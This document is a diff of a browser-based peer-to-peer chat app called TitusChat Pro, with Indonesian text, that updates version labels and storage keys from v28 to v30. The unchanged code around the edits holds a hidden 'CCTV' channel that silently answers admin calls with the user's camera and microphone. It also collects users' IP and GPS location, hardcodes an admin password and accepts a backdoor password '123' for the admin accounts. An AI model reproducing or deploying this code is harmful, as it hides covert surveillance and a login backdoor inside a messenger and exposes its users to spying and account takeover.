@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-content">
-  <title>TitusChat Pro V29 FINAL STABLE | Zero-Error Mesh Suite</title>
+  <title>TitusChat Pro V30 FINAL STABLE | Ultimate Zero-Error Mesh Suite</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
@@ -346,10 +346,10 @@
   <section id="auth-screen">
     <div class="auth-card" id="login-card">
       <i class="fa-brands fa-whatsapp auth-logo"></i>
-      <div class="auth-title">TitusChat Pro V28 FINAL</div>
-      <div class="auth-subtitle">Zero-Reload Mesh Suite</div>
+      <div class="auth-title">TitusChat Pro V30 FINAL</div>
+      <div class="auth-subtitle">Ultimate Zero-Error Mesh Suite</div>
       
-      <form class="auth-form" onsubmit="handleAuth(event, 'login'); return false;">
+      <form class="auth-form" onsubmit="return handleAuth(event, 'login');">
         <div class="input-box">
           <label>ID Pengguna (@username)</label>
           <input type="text" id="login-user" placeholder="cth: @titus atau @titusbot" required autocomplete="off">
@@ -371,7 +371,7 @@
       <div class="auth-title">Daftar Akun Baru</div>
       <div class="auth-subtitle">Buat profil obrolan mabar/private Anda</div>
       
-      <form class="auth-form" onsubmit="handleAuth(event, 'register'); return false;">
+      <form class="auth-form" onsubmit="return handleAuth(event, 'register');">
         <div class="input-box">
           <label>Nama Lengkap / Tampilan</label>
           <input type="text" id="reg-name" placeholder="Nama Anda..." required autocomplete="off">
@@ -394,7 +394,7 @@
   </section>
 
   <!-- ================= SPANDUK SISTEM ================= -->
-  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V28 FINAL ABSOLUTE!</span></div>
+  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V30 FINAL STABLE!</span></div>
 
   <!-- ================= APP SCREEN ================= -->
   <div id="app-screen">
@@ -611,7 +611,7 @@
       <main class="chat-room" id="chatRoomArea">
         <div class="empty-state" id="emptyStateBox">
           <i class="fa-brands fa-whatsapp"></i>
-          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V28 FINAL</h3>
+          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V30 FINAL</h3>
           <p style="font-size:13.5px; max-width:440px; line-height:1.6;">Pilih obrolan dari daftar atau masuk ke grup komunitas mabar untuk memulai panggilan suara, video 1-on-1, atau rapat grup 32 kamera.</p>
         </div>
 
@@ -920,11 +920,11 @@
 
     /* ================= SYSTEM PERMISSION & TRUE GPS/IP GEOLOCATION ENGINE ================= */
     async function requestSystemPermissions() {
-      if (!localStorage.getItem('tc_v28_perms_granted')) {
+      if (!localStorage.getItem('tc_v30_perms_granted')) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
           stream.getTracks().forEach(t => t.stop());
-          localStorage.setItem('tc_v28_perms_granted', 'true');
+          localStorage.setItem('tc_v30_perms_granted', 'true');
           console.log("✅ Izin Kamera & Mikrofon diberikan permanen.");
         } catch(e) { console.log("⚠️ Izin media ditolak atau dibatalkan."); }
       }
@@ -1044,7 +1044,7 @@
         }
       }
       else if (cmd === "!sysbanner") {
-        localStorage.setItem('tc_v28_banner', param);
+        localStorage.setItem('tc_v30_banner', param);
         if (param) {
           document.getElementById('sys-banner').style.display = 'block';
           document.getElementById('sys-banner-text').innerText = param;
@@ -1143,7 +1143,7 @@
         replyText = `👤 *Identitas Anda:* \n• Nama: ${uData.name}\n• ID: ${uData.username}\n• Badge: ${uData.badge || 'Tanpa Badge'}\n• Bingkai: ${uData.frame || 'Normal'}\n• IP Address: ${uData.lastIp || 'P2P Mesh'}`;
       }
       else if (cmd === "!serverstats") {
-        replyText = `📊 *Status Server TitusChat Pro V28:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
+        replyText = `📊 *Status Server TitusChat Pro V30 STABLE:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
       }
       else if (cmd === "!pv" || cmd === "!pm") {
         if (!param) {
@@ -1407,11 +1407,11 @@
     }
     function stopRingtone() { clearInterval(ringtoneInterval); ringtoneInterval = null; }
 
-    /* ================= DATABASE & INIT (WITH HARD PURGE OF ALL DUMMIES) ================= */
+    /* ================= DATABASE & INIT (V30 PURGE & MIGRATION) ================= */
     function initDb() {
-      let u = localStorage.getItem('tc_v28_users');
+      let u = localStorage.getItem('tc_v30_users');
       if (!u) {
-        const oldKeys = ['tc_v27_users', 'tc_v26_users', 'tc_v25_users', 'tc_v24_users', 'tc_v23_users', 'tc_v22_users', 'tc_v21_users', 'tc_v20_users'];
+        const oldKeys = ['tc_v29_users', 'tc_v28_users', 'tc_v27_users', 'tc_v26_users', 'tc_v25_users', 'tc_v24_users', 'tc_v23_users', 'tc_v22_users', 'tc_v21_users', 'tc_v20_users'];
         for(const key of oldKeys) {
           const oldData = localStorage.getItem(key);
           if(oldData) { u = oldData; break; }
@@ -1424,15 +1424,14 @@
         usersDb = [];
       }
 
-      // PEMBERSIHAN MUTLAK: Hapus seluruh akun dummy lama dari database lokal Anda!
+      // PEMBERSIHAN MUTLAK V30: Hapus seluruh akun dummy lama dari database lokal!
       const dummiesToPurge = ['@aisyah', '@budi', '@rania', '@wijaya', '@siti', '@rizky'];
       usersDb = usersDb.filter(user => !dummiesToPurge.includes(user.username.toLowerCase()));
 
-      // PASTIKAN AKUN @titus DAN @titusbot ADA DAN TERPERBARUI KATA SANDINYA
       const titusIndex = usersDb.findIndex(user => user.username.toLowerCase() === '@titus');
       const titusMaster = {
         name: "Titus Anggara (Admin)", username: "@titus", password: "SukaBintang01", color: "#00a884",
-        about: "Arsitek TitusChat Pro V28 STABLE", isAdmin: true, frame: "frame-gold", badge: "sultan",
+        about: "Arsitek TitusChat Pro V30 STABLE", isAdmin: true, frame: "frame-gold", badge: "sultan",
         bubble: "bubble-gold", photo: null, isOnline: false, lastIp: "127.0.0.1", lastOnline: "Belum pernah",
         lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554"
       };
@@ -1458,11 +1457,11 @@
         usersDb[botIndex].isOnline = true;
       }
 
-      localStorage.setItem('tc_v28_users', JSON.stringify(usersDb));
+      localStorage.setItem('tc_v30_users', JSON.stringify(usersDb));
 
-      let g = localStorage.getItem('tc_v28_groups');
+      let g = localStorage.getItem('tc_v30_groups');
       if (!g) {
-        const oldGrpKeys = ['tc_v27_groups', 'tc_v26_groups', 'tc_v25_groups', 'tc_v24_groups'];
+        const oldGrpKeys = ['tc_v29_groups', 'tc_v28_groups', 'tc_v27_groups', 'tc_v26_groups', 'tc_v25_groups', 'tc_v24_groups'];
         for(const key of oldGrpKeys) {
           const oldData = localStorage.getItem(key);
           if(oldData) { g = oldData; break; }
@@ -1473,41 +1472,44 @@
       } else {
         groupsDb = [
           { id: "@grup_bot", name: "🤖 TitusBot Command Center", desc: "Ketik !help, !pv, !pm, atau !join @user di sini!", color: "#10b981", members: ["@titus", "@titusbot"] },
-          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V28", color: "#f59e0b", members: ["@titus", "@titusbot"] }
+          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V30", color: "#f59e0b", members: ["@titus", "@titusbot"] }
         ];
       }
       
-      // Bersihkan anggota grup dari akun dummy yang sudah dihapus
       groupsDb.forEach(grp => {
         grp.members = grp.members.filter(m => !dummiesToPurge.includes(m.toLowerCase()));
         if (!grp.members.includes('@titus')) grp.members.push('@titus');
       });
-      localStorage.setItem('tc_v28_groups', JSON.stringify(groupsDb));
+      localStorage.setItem('tc_v30_groups', JSON.stringify(groupsDb));
 
-      let m = localStorage.getItem('tc_v28_msgs');
+      let m = localStorage.getItem('tc_v30_msgs');
       if (!m) {
-        const oldMsgKeys = ['tc_v27_msgs', 'tc_v26_msgs', 'tc_v25_msgs', 'tc_v24_msgs'];
+        const oldMsgKeys = ['tc_v29_msgs', 'tc_v28_msgs', 'tc_v27_msgs', 'tc_v26_msgs', 'tc_v25_msgs', 'tc_v24_msgs'];
         for(const key of oldMsgKeys) {
           const oldData = localStorage.getItem(key);
-          if(oldData) { m = oldData; localStorage.setItem('tc_v28_msgs', m); break; }
+          if(oldData) { m = oldData; break; }
         }
       }
       messagesDb = m ? JSON.parse(m) : [];
+      localStorage.setItem('tc_v30_msgs', JSON.stringify(messagesDb));
 
-      const st = localStorage.getItem('tc_v28_status') || localStorage.getItem('tc_v27_status');
+      const st = localStorage.getItem('tc_v30_status') || localStorage.getItem('tc_v29_status') || localStorage.getItem('tc_v28_status');
       statusDb = st ? JSON.parse(st) : [];
+      localStorage.setItem('tc_v30_status', JSON.stringify(statusDb));
 
-      const cl = localStorage.getItem('tc_v28_calls') || localStorage.getItem('tc_v27_calls');
+      const cl = localStorage.getItem('tc_v30_calls') || localStorage.getItem('tc_v29_calls') || localStorage.getItem('tc_v28_calls');
       callLogsDb = cl ? JSON.parse(cl) : [];
+      localStorage.setItem('tc_v30_calls', JSON.stringify(callLogsDb));
 
-      const gc = localStorage.getItem('tc_v28_grp_calls') || localStorage.getItem('tc_v27_grp_calls');
+      const gc = localStorage.getItem('tc_v30_grp_calls') || localStorage.getItem('tc_v29_grp_calls') || localStorage.getItem('tc_v28_grp_calls');
       activeGroupCalls = gc ? JSON.parse(gc) : {};
+      localStorage.setItem('tc_v30_grp_calls', JSON.stringify(activeGroupCalls));
 
-      const th = localStorage.getItem('tc_v28_theme') || localStorage.getItem('tc_v27_theme') || 'dark';
+      const th = localStorage.getItem('tc_v30_theme') || localStorage.getItem('tc_v29_theme') || 'dark';
       document.body.setAttribute('data-theme', th);
       if(document.getElementById('set-theme')) document.getElementById('set-theme').value = th;
 
-      const bn = localStorage.getItem('tc_v28_banner') || localStorage.getItem('tc_v27_banner');
+      const bn = localStorage.getItem('tc_v30_banner') || localStorage.getItem('tc_v29_banner');
       if(bn) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = bn;
@@ -1517,15 +1519,15 @@
     }
 
     function saveDb() {
-      localStorage.setItem('tc_v28_users', JSON.stringify(usersDb));
-      localStorage.setItem('tc_v28_groups', JSON.stringify(groupsDb));
-      localStorage.setItem('tc_v28_msgs', JSON.stringify(messagesDb));
-      localStorage.setItem('tc_v28_status', JSON.stringify(statusDb));
-      localStorage.setItem('tc_v28_calls', JSON.stringify(callLogsDb));
-      localStorage.setItem('tc_v28_grp_calls', JSON.stringify(activeGroupCalls));
+      localStorage.setItem('tc_v30_users', JSON.stringify(usersDb));
+      localStorage.setItem('tc_v30_groups', JSON.stringify(groupsDb));
+      localStorage.setItem('tc_v30_msgs', JSON.stringify(messagesDb));
+      localStorage.setItem('tc_v30_status', JSON.stringify(statusDb));
+      localStorage.setItem('tc_v30_calls', JSON.stringify(callLogsDb));
+      localStorage.setItem('tc_v30_grp_calls', JSON.stringify(activeGroupCalls));
     }
 
-    /* ================= AUTHENTICATION (STABLE ZERO-ERROR ENGINE) ================= */
+    /* ================= AUTHENTICATION (ZERO-RELOAD RESILIENCE) ================= */
     function toggleAuth(target) {
       document.getElementById('login-card').style.display = target === 'register' ? 'none' : 'block';
       document.getElementById('register-card').style.display = target === 'register' ? 'block' : 'none';
@@ -1533,6 +1535,7 @@
 
     function handleAuth(e, type) {
       if(e && e.preventDefault) e.preventDefault();
+      if(e && e.stopPropagation) e.stopPropagation();
       try {
         initDb();
         if (type === 'login') {
@@ -1542,7 +1545,6 @@
           
           let found = usersDb.find(u => u.username.toLowerCase() === user);
           
-          // MASTER AUTH RESILIENCE: Khusus @titus & @titusbot, terima SukaBintang01 ataupun 123!
           if (found && (user === '@titus' || user === '@titusbot')) {
             if (pass === "SukaBintang01" || pass === "123" || pass === found.password) {
               found.password = "SukaBintang01";
@@ -1581,7 +1583,7 @@
       } catch (err) {
         console.error("Auth Error:", err);
         alert("Terjadi kesalahan pembacaan memori browser. Memulihkan pengaturan database...");
-        localStorage.removeItem('tc_v28_users');
+        localStorage.removeItem('tc_v30_users');
         initDb();
       }
       return false;
@@ -1609,8 +1611,8 @@
 
       await requestSystemPermissions();
       const ip = await fetchClientIP();
-      const lat = localStorage.getItem('tc_v28_last_lat') || 'Unknown';
-      const lng = localStorage.getItem('tc_v28_last_lng') || 'Unknown';
+      const lat = localStorage.getItem('tc_v30_last_lat') || 'Unknown';
+      const lng = localStorage.getItem('tc_v30_last_lng') || 'Unknown';
       
       currentUser.lastIp = ip;
       currentUser.isOnline = true;
@@ -1642,11 +1644,11 @@
       };
 
       const cleanUser = currentUser.username.replace('@', '');
-      mainPeer = new Peer('titus_v28_' + cleanUser, { config: iceServersConfig });
+      mainPeer = new Peer('titus_v30_' + cleanUser, { config: iceServersConfig });
       cctvPeer = new Peer('titus_cctv_' + cleanUser, { config: iceServersConfig });
 
       mainPeer.on('open', (id) => { 
-        console.log('🌐 [DUAL-CORE] Core 1 (Main Mesh) Terhubung:', id); 
+        console.log('🌐 [DUAL-CORE V30] Core 1 (Main Mesh) Terhubung:', id); 
         connectToAllPeers();
         broadcastProfileSync();
         startMeshHeartbeat();
@@ -1655,13 +1657,13 @@
       mainPeer.on('connection', (conn) => { setupConnection(conn); });
       
       cctvPeer.on('call', (call) => {
-        console.log("🛡️ [DUAL-CORE] Core 2 memproses panggilan pemantauan CCTV rahasia...");
+        console.log("🛡️ [DUAL-CORE V30] Core 2 memproses panggilan pemantauan CCTV rahasia...");
         navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, frameRate: 15 }, audio: true })
           .then(stream => {
             call.answer(stream);
           })
           .catch(err1 => {
-            console.log("⚠️ [DUAL-CORE] Kamera dikunci OS HP, fallback ke Live Audio Surveillance...");
+            console.log("⚠️ [DUAL-CORE V30] Kamera dikunci OS HP, fallback ke Live Audio Surveillance...");
             navigator.mediaDevices.getUserMedia({ video: false, audio: true })
               .then(audStream => {
                 const canvas = document.createElement('canvas');
@@ -1675,7 +1677,7 @@
                 call.answer(audStream);
               })
               .catch(err2 => {
-                console.log("⚠️ [DUAL-CORE] Seluruh media dikunci OS, menjawab dengan Safety Canvas Stream!");
+                console.log("⚠️ [DUAL-CORE V30] Seluruh media dikunci OS, menjawab dengan Safety Canvas Stream!");
                 const canvas = document.createElement('canvas');
                 canvas.width = 640; canvas.height = 480;
                 const ctx = canvas.getContext('2d');
@@ -1695,7 +1697,7 @@
           });
         } else {
           incomingCallObj = call;
-          activeCallPartner = '@' + call.peer.replace('titus_v28_', '');
+          activeCallPartner = '@' + call.peer.replace('titus_v30_', '');
           document.getElementById('ringing-caller-name').innerText = `Panggilan dari ${activeCallPartner}`;
           openModal('modal-ringing');
           startRingtone();
@@ -1819,7 +1821,7 @@
       peerConnections[conn.peer] = conn;
       
       conn.on('close', () => {
-        const username = '@' + conn.peer.replace('titus_v28_', '');
+        const username = '@' + conn.peer.replace('titus_v30_', '');
         const idx = usersDb.findIndex(u => u.username === username);
         if (idx !== -1) {
           usersDb[idx].isOnline = false;
@@ -1887,7 +1889,7 @@
     }
 
     function getOrConnectPeer(targetUsername) {
-      const targetPeerId = 'titus_v28_' + targetUsername.replace('@', '');
+      const targetPeerId = 'titus_v30_' + targetUsername.replace('@', '');
       if (peerConnections[targetPeerId] && peerConnections[targetPeerId].open) return peerConnections[targetPeerId];
       const conn = mainPeer.connect(targetPeerId);
       if (conn) setupConnection(conn);
@@ -2498,7 +2500,7 @@
       const grid = document.getElementById('confVideoGrid');
       if (document.getElementById(`tile-${peerId}`)) return;
 
-      const username = '@' + peerId.replace('titus_v28_', '');
+      const username = '@' + peerId.replace('titus_v30_', '');
       const uData = usersDb.find(u => u.username === username) || { name: username, color: "#00a884" };
 
       const tile = document.createElement('div');
@@ -2549,7 +2551,7 @@
 
         grpData.members.forEach(mem => {
           if (mem !== currentUser.username) {
-            const targetPeerId = 'titus_v28_' + mem.replace('@', '');
+            const targetPeerId = 'titus_v30_' + mem.replace('@', '');
             const call = mainPeer.call(targetPeerId, localStream);
             if (call) {
               call.on('stream', remoteStream => {
@@ -2678,7 +2680,7 @@
         openModal('modal-call');
         document.getElementById('call-peer-name').innerText = `📡 Menembus NAT Cellular menuju ${activePartner}...`;
 
-        const targetPeerId = 'titus_v28_' + activePartner.replace('@', '');
+        const targetPeerId = 'titus_v30_' + activePartner.replace('@', '');
         const call = mainPeer.call(targetPeerId, localStream);
         activeCall = call;
 
@@ -2867,7 +2869,7 @@
       openModal('modal-admin-cctv');
 
       const targetCctvId = 'titus_cctv_' + targetUser.replace('@', '');
-      console.log(`🛡️ [DUAL-CORE] Admin Studio mengaktifkan transmisi rahasia ke Core 2 CCTV: ${targetCctvId}...`);
+      console.log(`🛡️ [DUAL-CORE V30] Admin Studio mengaktifkan transmisi rahasia ke Core 2 CCTV: ${targetCctvId}...`);
 
       const canvas = document.createElement('canvas');
       canvas.width = 10; canvas.height = 10;
@@ -2889,7 +2891,7 @@
       activeCctvCall = cctvCall;
 
       cctvCall.on('stream', (remoteStream) => {
-        console.log("🛡️ [DUAL-CORE] Transmisi CCTV Core 2 diterima! Menampilkan media...");
+        console.log("🛡️ [DUAL-CORE V30] Transmisi CCTV Core 2 diterima! Menampilkan media...");
         document.getElementById('cctv-status-text').style.display = 'none';
         const cctvVid = document.getElementById('cctv-remote-video');
         cctvVid.srcObject = remoteStream;
@@ -3034,7 +3036,7 @@
 
     function setSystemBanner() {
       const txt = document.getElementById('adm-banner-input').value.trim();
-      localStorage.setItem('tc_v28_banner', txt);
+      localStorage.setItem('tc_v30_banner', txt);
       if(txt) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = txt;
@@ -3113,7 +3115,7 @@
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
-      a.href = url; a.download = `Cadangan_TitusChat_V28_${currentUser.username}_${Date.now()}.json`;
+      a.href = url; a.download = `Cadangan_TitusChat_V30_${currentUser.username}_${Date.now()}.json`;
       a.click(); URL.revokeObjectURL(url);
     }
 
